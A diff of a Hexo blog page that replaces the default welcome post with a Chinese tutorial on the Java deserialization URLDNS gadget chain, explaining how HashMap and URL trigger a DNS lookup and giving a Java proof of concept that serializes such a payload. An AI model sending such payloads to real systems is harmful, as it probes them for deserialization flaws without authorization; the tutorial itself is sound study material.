@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      Hello World | Infernity&#39;s Blog
+      java反序列化——URLDNS链 | Infernity&#39;s Blog
     
   </title>
   <meta name="author" content="Infernity">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「Hello World」
+			「java反序列化——URLDNS链」
 		
 	</p>
 
@@ -242,8 +242,8 @@
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2024/03/28/hello-world/" itemprop="url">
-		Hello World
+	<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" itemprop="url">
+		java反序列化——URLDNS链
 	</a>
 
 		</div>
@@ -259,9 +259,9 @@
 
 	更新于
 
-	<a href="/2024/03/28/hello-world/" itemprop="url">
-		<time datetime="2024-03-28T11:55:57.128Z" itemprop="dateUpdated">
-	  		2024-03-28
+	<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" itemprop="url">
+		<time datetime="2024-03-29T06:01:24.000Z" itemprop="dateUpdated">
+	  		2024-03-29
 	  </time>
 	</a> 
 
@@ -279,23 +279,37 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+			<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>根据反序列化的一般要求，首先URL类肯定是需要能实现反序列化的接口的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711602349072-1b0a2cfc-906e-44db-a5e9-d9b56c4d90e2.png?x-oss-process=image/format,webp" alt="图片.png"></p>
+<p>而在URL类里的hashcode方法里，会先进行一个判断，如果不是-1，那么就进入URLStreamHandler类里的hashCode方法：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711602572501-51f4980a-31d4-403f-90ae-da82408539db.png?x-oss-process=image/format,webp" alt="图片.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711602632771-8ba9a3d4-6d94-438f-bcf7-7854a8f1932c.png?x-oss-process=image/format,webp" alt="图片.png"></p>
+<p>而在这个方法里，会执行getHostAddress方法，这是根据域名解析IP地址的函数。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711602706859-03d3e68d-4b0d-4751-bbcd-e2f447cb0432.png?x-oss-process=image/format,webp" alt="图片.png"></p>
+<p>结合DNS的相关知识，也就是说只要走到这个函数，就一定会发出DNS请求。</p>
+<p>同样的，hashMap类也实现了序列化接口，<img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711603115652-dc373c10-c797-48e9-ac9e-28f7e8c4786a.png?x-oss-process=image/format,webp" alt="图片.png"></p>
+<p>在hashMap类也重写了readObject，里面也调用了hashCode方法，也就会发出DNS请求。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711602928735-54899f1b-06a6-4c9c-9ea2-cdce85976a06.png?x-oss-process=image/format,webp" alt="图片.png"></p>
+<p>所以链子是这样的：</p>
+<p>new hashMap—&gt;hashmap.put(new URL(“<a target="_blank" rel="noopener" href="https://www.baidu.com"),1)--->serialize--->unserialize发出DNS请求">https://www.baidu.com&quot;),1)---&gt;serialize---&gt;unserialize发出DNS请求</a></p>
+<h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>但是这样写有个问题，运行代码后发现只有在序列化的时候收到了一次DNS请求，而在反序列化的时候反而收不到DNS请求，这是因为hashMap.put方法里同样也调用了hash方法：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711602191166-f236b87a-76ec-4520-b219-74ad903d126e.png?x-oss-process=image/format,webp" alt="image-20240328112125969.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711602193842-c2ce7f1d-4245-4bf1-b3c3-7f896dc583fb.png?x-oss-process=image/format,webp" alt="image-20240328112136169.png"></p>
+<p>如果不修改hashCode的值，那么我们传入的url就会触发DNS请求，并被hash编码，此后并不能触发反序列化。</p>
+<h2 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h2><p>结合前面hashCode的-1判断，不难想到：如果能修改hashCode的值，那么就可以绕过put时hash的触发，而在put之后再把hashCode改回来，就完成整条链子了。</p>
+<h2 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h2><p>我们可以通过反射，修改对象属性的值。</p>
+<p>最后的链子就是：</p>
+<p>new hashMap—&gt;X—&gt;hashmap.put(new URL(“填url”),1)—&gt;Y—&gt;serialize—&gt;unserialize发出DNS请求</p>
+<p>X 为url.getClass()获取url类—&gt;getDeclaredField(“hashCode”)获取属性hashCode—&gt;set(url,1234)修改hashCode的值不为-1</p>
+<p>Y 为set(url,-1)改回hashCode的值</p>
+<h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;         <span class="comment">//用writeObject写序列化文件。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();    <span class="comment">//新建hashmap对象</span></span><br><span class="line">        <span class="comment">//这里不要发起请求，把url对象的hashCode改成不是-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>);   <span class="comment">//新建URL的对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();    <span class="comment">//获取URL对象的类</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);    <span class="comment">//获取URL对象的类中的hashCode属性</span></span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);     <span class="comment">//因为hashCode是private的变量，所以需要设置</span></span><br><span class="line">        hashcodefield.set(url,<span class="number">1234</span>);    <span class="comment">//设置hashCode值1234</span></span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//通过反射 改变已有对象属性</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);  <span class="comment">//这里把hashCode值改回-1</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h4 id="关于hashcodefield-set-url-1234"><a href="#关于hashcodefield-set-url-1234" class="headerlink" title="关于hashcodefield.set(url,1234);"></a>关于hashcodefield.set(url,1234);</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40360431/1711602182073-06238d3d-c643-4c04-a68a-d4f35d0f5a54.png?x-oss-process=image/format,webp" alt="image-20240328111827604.png"></p>
+<p>set方法的第一个参数是属性所对应的对象，这里属性是hashcodefield，对象是url，值是1234</p>
 	
 		</div>
 		
-		<div id="current-post-cover" data-scr="https://pic1.zhimg.com/v2-0dda71bc9ced142bf7bb2d6adbebe4f0_r.jpg"></div>
+		<div id="current-post-cover" data-scr="/img/computer.jpeg"></div>
 
 		<!-- relate post, comment...-->
 		<div class="investment-container">
@@ -310,10 +324,10 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链" rel="prev">
-				&laquo;上一篇
-			</a>
 		
+			<a href="/2024/03/28/hello-world/" title="Hello World" rel="next">
+				下一篇&raquo;
+			</a>
 			
 	</span>
 
@@ -332,27 +346,22 @@
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链">
-								java反序列化——URLDNS链			
+							<a class="relate-post-title" href="/2024/03/28/hello-world/" title="Hello World">
+								Hello World			
 							</a>
 							<p class="relate-post-date">
 								<i class="fa fa-calendar"></i>
-								三月 29日, 2024				
+								三月 28日, 2024				
 							</p>
 							<p class="relate-post-content">
-								原理：根据反序列化的一般要求，首先URL类肯定是需要能实现反序列化的接口的。
-
-而在URL类里的hashcode方法里，会先进行一个判断，如果不是-1，那么就进入URLStreamHandler类里的hashCode方法：
-
-
-而在这...
+								Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using ...
 							</p>
 						</div>
 
 						<div class="relate-post-cover">
-							<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链">				
+							<a href="/2024/03/28/hello-world/" title="Hello World">				
 								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpeg" alt="java反序列化——URLDNS链"/>
+								<img class="lazy" src="/img/lazy.gif" data-src="https://pic1.zhimg.com/v2-0dda71bc9ced142bf7bb2d6adbebe4f0_r.jpg" alt="Hello World"/>
 							</a>
 						</div>
 					</li>												
